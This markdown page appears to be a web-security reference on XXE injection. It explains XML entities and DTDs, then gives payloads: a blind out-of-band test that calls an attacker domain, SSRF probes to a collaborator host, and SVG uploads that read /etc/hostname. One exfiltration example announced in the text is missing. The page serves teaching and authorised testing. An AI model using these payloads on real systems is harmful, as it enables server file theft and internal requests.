---
title: XXE - XML External Entity injection
badge: Web
description: An XML External Entity attack is a type of attack against an application that parses XML input.
---
## XML Basics

**Most of this part was taken from this amazing Portswigger page:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### What is XML?

XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML"). But its popularity has now declined in favor of the JSON format.

### What are XML entities?

XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

### What are XML elements?

Element type declarations set the rules for the type and number of elements that may appear in an XML document, what elements may appear inside each other, and what order they must appear in. For example:

* `<!ELEMENT stockCheck ANY>` Means that any object could be inside the parent `<stockCheck></stockCheck>`
* `<!ELEMENT stockCheck EMPTY>` Means that it should be empty `<stockCheck></stockCheck>`
* `<!ELEMENT stockCheck (productId,storeId)>` Declares that `<stockCheck>` can have the children `<productId>` and `<storeId>`

### What is document type definition? 

The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

### What are XML custom entities? 

XML allows custom entities to be defined within the DTD. For example:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".

### What are XML external entities? 

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

XML external entities provide the primary means by which [XML external entity attacks](https://portswigger.net/web-security/xxe) arise.

### What are XML Parameter entities?

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

`<!ENTITY % myparameterentity "my parameter entity value" >`

And second, parameter entities are referenced using the percent character instead of the usual ampersand: `%myparameterentity;`

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.


## Exploitation


### SSRF attacks

The easiest way to check if the target is vulnerable would be something like the following:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{{ collaborator your.burpcollaborator.net }}/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

If you are lucky, data exfiltration could be possible:




### SVG file upload
You could be able to retrieve files from the server:
```markup
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "{{ xxe-payload file:///etc/hostname }}" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```



SSRF attacks could also be possible:
```markup
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://{{ collaborator your.burpcollaborator.net }}/" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
